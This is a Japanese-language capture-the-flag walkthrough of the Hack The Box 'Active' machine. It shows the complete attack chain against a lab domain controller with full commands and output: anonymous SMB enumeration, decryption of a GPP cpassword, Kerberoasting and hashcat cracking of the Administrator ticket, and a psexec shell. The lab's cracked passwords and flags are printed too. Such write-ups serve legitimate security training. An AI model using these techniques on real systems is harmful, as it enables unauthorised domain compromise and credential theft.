https://app.hackthebox.com/machines/Active

## STEP 1
```sh
└─$ rustscan -a 10.129.246.135 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.246.135:53
Open 10.129.246.135:88
Open 10.129.246.135:139
Open 10.129.246.135:135
Open 10.129.246.135:464
Open 10.129.246.135:445
Open 10.129.246.135:389
Open 10.129.246.135:593
Open 10.129.246.135:636
Open 10.129.246.135:3268
Open 10.129.246.135:3269
Open 10.129.246.135:5722
Open 10.129.246.135:49152
Open 10.129.246.135:49154
Open 10.129.246.135:49153
Open 10.129.246.135:49155
Open 10.129.246.135:49157
Open 10.129.246.135:49158
Open 10.129.246.135:49162
Open 10.129.246.135:49167
Open 10.129.246.135:49169
10.129.246.135 -> [53,88,139,135,464,445,389,593,636,3268,3269,5722,49152,49154,49153,49155,49157,49158,49162,49167,49169]
```


## STEP 2
パスワードなしでアクセスできるReplicationを発見
```sh
└─$ smbmap -H 10.129.246.135

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.246.135:445      Name: 10.129.246.135            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections                                                                                                     
```
Replication配下を再帰で探索
```sh
└─$ smbmap -H 10.129.246.135 -r Replication --depth 10

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.246.135:445      Name: 10.129.246.135            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        ./Replication
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
        ./Replication//active.htb
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
        ./Replication//active.htb/DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
        ./Replication//active.htb/Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 06:38:11 2018    GptTmpl.inf
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
        ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 06:38:11 2018    Groups.xml
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 06:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
[*] Closed 1 connections
```
ちなみに`smbclient`コマンドでも再帰的に表示できる
```sh
└─$ smbclient -N //10.129.246.135/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
```
`Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups 配下に Groups.xml`を発見・ダウンロード  
このXMLはGPP（グループポリシー基本設定）のデータっぽい
```sh
└─$ smbget -N smb://10.129.246.135/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
Using domain: WORKGROUP, user: kali
smb://10.129.246.135/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
Downloaded 533b in 7 seconds
```
[MS14-025](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)という脆弱性があり、以前GPPにユーザとAESで暗号化されたパスワードが含まれていた
```sh
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
[AESの鍵](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)がmicrosortで公開されており、`gpp-decrypt`でクラックできる  
active.htb\SVC_TGS のパスワードは GPPstillStandingStrong2k18
```sh
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
GPPstillStandingStrong2k18
```


## STEP 3
SVC_TGS ユーザではアクセス可能なフォルダが増えた
```sh
└─$ smbmap -H 10.129.246.135 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18                       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.246.135:445      Name: 10.129.246.135            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```
Usersフォルダも参照できたため、ユーザフラグゲット！
```sh
└─$ smbget -U active.htb/SVC_TGS%GPPstillStandingStrong2k18 smb://10.129.246.135/Users/SVC_TGS/Desktop/user.txt
Using domain: ACTIVE.HTB, user: SVC_TGS
smb://10.129.246.135/Users/SVC_TGS/Desktop/user.txt                                                                                                                                                                                         
Downloaded 34b in 13 seconds
                                                                                                                                                                                                                                            

└─$ cat user.txt  
b603b6e3a31eb7b6e675b760cb537559
```


## STEP 4
`ldapsearch`でSPNが設定されているユーザを確認するとなぜかadministratorを確認できた
```sh
└─$ ldapsearch -LLL -x -D SVC_TGS@active.htb -w GPPstillStandingStrong2k18 -H ldap://10.129.246.135 -b "dc=active,dc=htb" "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
dn: CN=Administrator,CN=Users,DC=active,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=active,DC=htb
instanceType: 4
whenCreated: 20180718184911.0Z
whenChanged: 20250605131339.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=active,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=active,DC=htb
uSNChanged: 110624
name: Administrator
objectGUID:: jnHKJRJzf0aVWkxPEJY8Hg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 131774446554773106
lastLogoff: 0
lastLogon: 133936028571973435
logonHours:: ////////////////////////////
pwdLastSet: 131764144003517228
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv129AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 107
sAMAccountName: Administrator
sAMAccountType: 805306368
servicePrincipalName: active/CIFS:445
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20180718203435.0Z
dSCorePropagationData: 20180718201454.0Z
dSCorePropagationData: 20180718190545.0Z
dSCorePropagationData: 20180718190545.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133936028193516770
msDS-SupportedEncryptionTypes: 0

dn: CN=krbtgt,CN=Users,DC=active,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: krbtgt
description: Key Distribution Center Service Account
distinguishedName: CN=krbtgt,CN=Users,DC=active,DC=htb
instanceType: 4
whenCreated: 20180718185035.0Z
whenChanged: 20180718190545.0Z
uSNCreated: 12324
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=active,DC=htb
uSNChanged: 12739
showInAdvancedViewOnly: TRUE
name: krbtgt
objectGUID:: 56HXQ6alq0mC0OJOdHL4jQ==
userAccountControl: 514
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 131764134369720307
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAArxktGAS1AL49Gv129gEAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: krbtgt
sAMAccountType: 805306368
servicePrincipalName: kadmin/changepw
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=active,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20180718190545.0Z
dSCorePropagationData: 16010101000000.0Z

# refldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb

# refldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb

# refldap://active.htb/CN=Configuration,DC=active,DC=htb
```
`kerberoasting`でSPNが設定されているadministratorのTGSチケットを取得することができた
```sh
└─$ impacket-GetUserSPNs -request -outputfile svc_tgs -dc-ip 10.129.246.135 active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-06-05 09:14:17.197344             



[-] CCache file is not found. Skipping...
```
`hashcat`でクラック成功！  
administratorのパスワードは Ticketmaster1968
```sh
└─$ hashcat -a 0 -m 13100 svc_tgs /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 1757/3578 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2fc97ac126dece09da9bfc9f067e1ab9$a193cd2e49549b68b275c2bd2558c472163fb4d091eb1f7fbee8b81203476f432bc35337ccd0b79b52395ae3717ffea476294494bd18215e30e969171931c757ca946a7227b265150f9bb511a61097b68a9ccd2f2a4e9f1b2df08588242c170273b30a5fb7bfb83bae18ffc0d5e7aa1bc6df558359d49d2ad7600d46bf411bed0a3a7fdde845da2aae130a34cc8ae8bf036eed53f853e3df38bb3fdb8f0b5c0a212a7fb2d9f872de0233b794a246ffd8a4c45db757712cacd5ef188d6a667bd1b013fc03421082da1ce9e36f47d3d229a23effb37879e4cfeb74388572e257b410744b93892a56848559fc60c6436b21944221f769d16157229244dfdbf110e9ed0bc70fea274954819501a37c6996ffb8ec21b4eb48621e2bf7f46bf461b86e1a894f4bb3db7c9ee233e0cb01a7f7983ce8901c51e5fbf8d47234667b8b94fbafed9c4e21aac0f4a2b03d3d9db5998053fda1d18e03f1626efbd959f2b05fa9e2433db53b04da360470faa18a709a14741c02e1139e4c1660af68524e23539e2c18c497a338d9984469b0dba4133eca0657244666aecacf240818cad6f29c9ffbc0cbd065439c0ebece3ef012478b8ff46eabc5d2714b161db47f48da4df2cc0e128084f60f79cc059c0158869a3491f2d94c5b11e56ef79dc511392ae9f2967af6b3c19506eae3d6e5b2ae94256d5149d9e5a174a45cecf72c1299bba572cfb4104d1f1f5e36afb44fa3412946644186e24926d7d0d52f71dabedd705d77370e938e86660100c16c558c7f30bde3be6298398a51a385fce0dd78acd31c8dbfbe79c6ff9517b25fa541c6c4d07c3da30fce9d7ec88d33de96badadd3a93e5d01d0ee562d54ee213bd4f3a9cdac3db92b17fe7554e83602ce15a8265f2ae298758bc8a4b7b00a6eaa9643533c9cdcc464a28b2538d5f9ab83321effd1f62a15650857c6fbf22ad58466ce65e20df0e6b10d5a29ff8f4fbde7b073fb0d76bd626310f06aa44b1282ed8568cd08e6bca007b4dd9901a8ae572be7da62c49e9e9c8a2f87bc1180ef94bfbd60ee8fc69e261012da3b3ed57b911ecb4803fd0a4d9ac566e84ffc1e0c33aa341983acca962fc20d04369e391abf666a822812469612a0e7fd36bbf6bbdaa6bf32df7b3e55c8519f9393d6e258f6b0774b93312d263f31b9b996a17a844fc3d57408d21d3ecb5830d426852b5f11bf8966be8c92ccece229b1d2660335ff90a840d482dffc04347d69b3912c561b539fa:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...b539fa
Time.Started.....: Thu Jun  5 22:08:39 2025 (19 secs)
Time.Estimated...: Thu Jun  5 22:08:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   577.3 kH/s (0.63ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10537472/14344385 (73.46%)
Rejected.........: 0/10537472 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Tiana87
Hardware.Mon.#1..: Util: 45%

Started: Thu Jun  5 22:08:28 2025
Stopped: Thu Jun  5 22:08:58 2025
```
administrator権限で列挙
```sh
└─$ smbmap -H 10.129.246.135 -d active.htb -u administrator -p Ticketmaster1968

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[!] Unable to remove test file at \\10.129.246.135\SYSVOL\EBPOFYNQXC.txt, please remove manually                             
                                                                                                                             
[+] IP: 10.129.246.135:445      Name: 10.129.246.135            Status: ADMIN!!!   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections
```
smbでルートフラグを直接参照してもいいが、`ADMIN$`が読み書き権限があるのでpsexecで侵入してルートフラグゲット
```sh
└─$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.129.246.135
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.246.135.....
[*] Found writable share ADMIN$
[*] Uploading file nvUhGEMd.exe
[*] Opening SVCManager on 10.129.246.135.....
[*] Creating service wrNJ on 10.129.246.135.....
[*] Starting service wrNJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
24da85b6531d2a84546ddd908981316c
```
